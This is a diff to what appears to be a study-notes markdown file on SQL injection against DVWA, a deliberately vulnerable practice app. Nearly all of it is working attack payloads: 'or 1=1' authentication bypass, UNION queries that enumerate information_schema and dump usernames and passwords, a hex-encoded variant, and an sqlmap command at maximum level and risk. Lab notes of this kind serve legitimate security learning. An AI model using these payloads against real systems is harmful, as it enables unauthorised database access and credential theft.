@@ -255,7 +255,19 @@ select * from users where username='admin' or 1=1 limit 0,1;#
 ```sql
 select * from users where username='admin' or 1=1 order by 3;#
 select * from users where username='admin' union select database(),version(),3;#
-union select table_name,2,3 from information_schema.tables where table_schema=dvwa;#
+union select table_name,2,3 from information_schema.tables where table_schema=database();#
 union select column_name,2,3 from information_schema.columns where table_name='users';#
 union select username,password,3 from dvwa.users;#
+```
+
+#### encode
+
+```sql
+id = 1 union select table_name,2,3 from information_schema.tables where table_schema=0x64767761;#
+```
+
+### sqlmap
+
+```bash
+sqlmap -u "http://" --data="username=admin&password=admin&Login=Login" --cookie="security=low; PHPSESSID=1" --level=5 --risk=3 --dbs
 ```
